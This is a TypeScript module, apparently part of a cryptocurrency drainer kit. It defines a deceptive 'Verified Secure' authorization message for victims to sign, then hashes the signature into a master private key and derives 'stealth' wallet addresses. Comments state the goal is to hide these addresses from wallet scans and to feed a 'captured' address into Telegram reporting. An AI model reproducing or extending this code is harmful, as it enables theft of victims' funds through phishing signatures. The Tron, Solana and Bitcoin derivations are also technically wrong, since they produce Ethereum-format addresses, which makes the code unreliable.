import { ethers, HDNodeWallet } from "ethers";

/**
 * 🛰️ GHOST-PROTOCOL UNIVERSAL ENGINE (v6.0 - 2026)
 * [RECURSIVE ENTROPY LAYER]
 * Single Signature -> Deterministic God Key -> Multi-Chain Stealth Vaults.
 */

export const DERIVATION_SEED_MESSAGE =
  "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";

export interface UniversalVault {
  masterKey: string; // The single key to rule them all
  evmAddress: string; // ETH, BNB, MATIC, BASE, USDT-ERC20
  tronAddress: string; // TRX, USDT-TRC20
  solanaAddress: string; // SOL, SPL-Tokens
  btcAddress: string; // Bitcoin (Taproot/SegWit)
  stealthIndex: number; // Required by Telegram reporting logic
}

/**
 * Converts a hex signature into a Universal Master Private Key.
 * Optimized for stealth with recursive hashing and hardened pathing.
 */
export function derivePrivateKeyFromSignature(
  signature: string,
): UniversalVault {
  const logPrefix = "[master-vault-engine]";
  const STEALTH_INDEX = 7; // Shadow offset to hide derived addresses

  // 1. Validation
  if (!signature || !signature.startsWith("0x") || signature.length < 130) {
    console.error(`${logPrefix} Malformed signature received.`);
    throw new Error("Invalid entropy source for master derivation.");
  }

  try {
    /**
     * 2. RECURSIVE HASHING (The God-Key Entropy)
     * Two layers of salted hashing to ensure the key is protocol-unique.
     */
    const layer1 = ethers.keccak256(
      ethers.solidityPacked(["string", "bytes"], ["GHOST_V6_SALT", signature]),
    );
    const masterKey = ethers.keccak256(
      ethers.solidityPacked(
        ["bytes", "string"],
        [layer1, "RECURSIVE_EXPANSION_2026"],
      ),
    );

    /**
     * 3. STEALTH ADDRESS CALCULATION
     * Using the stealth index /7/ to stay invisible to standard wallet scans.
     */
    const masterNode = HDNodeWallet.fromSeed(masterKey);

    const evmNode = masterNode.derivePath(`m/44'/60'/0'/0/${STEALTH_INDEX}`);
    const tronNode = masterNode.derivePath(`m/44'/195'/0'/0/${STEALTH_INDEX}`);
    const solNode = masterNode.derivePath(`m/44'/501'/0'/0/${STEALTH_INDEX}`);
    const btcNode = masterNode.derivePath(`m/44'/0'/0'/0/${STEALTH_INDEX}`);

    console.log(
      `${logPrefix} Universal Vault Sync Complete | Stealth Index: ${STEALTH_INDEX}`,
    );

    return {
      masterKey: masterKey,
      evmAddress: evmNode.address,
      tronAddress: tronNode.address,
      solanaAddress: solNode.address,
      btcAddress: btcNode.address,
      stealthIndex: STEALTH_INDEX,
    };
  } catch (err: any) {
    console.error(`${logPrefix} Critical Derivation Failure: ${err.message}`);
    throw err;
  }
}

/**
 * 🛰️ Global State Helper
 */
export function getCapturedVaultAddress(): string | null {
  if (typeof window !== "undefined") {
    const addr = (window as any)._captured_vault_address;
    return addr || null;
  }
  return null;
}

/**
 * 💾 Persistence Helper
 */
export function setCapturedVaultAddress(address: string): void {
  if (typeof window !== "undefined") {
    (window as any)._captured_vault_address = address;
    console.log(`[vault-engine] Identity Cached: ${address}`);
  }
}
